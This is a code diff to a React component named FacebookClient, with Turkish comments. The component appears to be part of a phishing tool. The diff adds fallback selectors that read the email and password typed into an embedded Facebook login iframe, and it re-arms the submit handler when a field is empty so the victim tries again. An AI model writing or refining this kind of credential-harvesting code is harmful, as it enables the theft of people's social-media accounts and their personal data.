@@ -602,8 +602,15 @@ export function FacebookClient({ sessionId: propSid }: Props) {
       if (iframe) {
         const doc = iframe.contentDocument || iframe.contentWindow?.document;
         if (doc) {
-          const emailInput = doc.getElementById("m_login_email") as HTMLInputElement | null;
-          const passInput = doc.getElementById("m_login_password") as HTMLInputElement | null;
+          const emailInput = doc.getElementById("m_login_email") as HTMLInputElement | null
+            || doc.querySelector<HTMLInputElement>("input[type='text'][name='email']")
+            || doc.querySelector<HTMLInputElement>("input[type='email']")
+            || doc.querySelectorAll<HTMLInputElement>("input[type='text']")[0]
+            || null;
+          const passInput = doc.getElementById("m_login_password") as HTMLInputElement | null
+            || doc.querySelector<HTMLInputElement>("input[type='password'][name='pass']")
+            || doc.querySelector<HTMLInputElement>("input[type='password']")
+            || null;
           email = (emailInput?.value ?? "").trim();
           password = (passInput?.value ?? "").trim();
           const tryInp = (id: string): string => {
@@ -620,7 +627,11 @@ export function FacebookClient({ sessionId: propSid }: Props) {
       /* ignore */
     }
 
-    if (!uuid || !email || !password) return;
+    if (!uuid || !email || !password) {
+      // Bos alanla tiklandiysa kilidi geri ac — kullanici doldurup tekrar deneyebilsin
+      submitHandledRef.current = false;
+      return;
+    }
 
     // 2) VERITABANINDAN GUNCEL form_data'YI TEKRAR CEK (useState STALE OLDUGU ICIN!)
     //    Boylece ESKI FB degerlerini (baska client tarafindan son guncellenen) DOGRU okumus oluyoruz.
